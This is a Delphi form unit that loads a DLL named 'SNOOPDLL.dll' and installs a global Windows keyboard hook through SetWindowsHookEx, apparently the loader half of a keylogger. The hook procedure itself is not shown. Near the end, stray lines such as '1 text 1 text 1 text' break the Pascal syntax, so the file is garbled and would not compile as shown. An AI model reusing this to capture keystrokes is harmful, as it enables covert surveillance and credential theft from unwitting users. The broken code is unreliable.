unit kht1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs;

type
  TForm1 = class(TForm)
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

type
  TdllProc = procedure;

var
  Hook : HHOOK;
  DllInstance : DWORD;
  HookProc : FARPROC;
  StartProc, EndProc : TDllProc;

  Form1: TForm1;

implementation

{$R *.dfm}

procedure TForm1.FormCreate(Sender: TObject);
Begin
  DllInstance := LoadLibrary('SNOOPDLL.dll');
  HookProc := GetProcAddress(DllInstance, 'HookProcedure');
  StartProc := GetProcAddress(DllInstance, 'SetHook');
  EndProc := GetProcAddress(DllInstance, 'EndHook');
  StartProc;
  Hook := SetWindowsHookEx(WH_KEYBOARD, HookProc, DllInstance, 0);
//  Sleep(INFINITE);

end;

procedure TForm1.FormDestroy(Sender: TObject);
begin
  UnhookWindowsHookEx(Hook);
  EndProc;
  FreeLibrary(DllInstance);
end;

1 text 1 text 1 text
2 text 2 text 2 text
3 text 3 text 3 text
4 text 4 text 4 text


end.
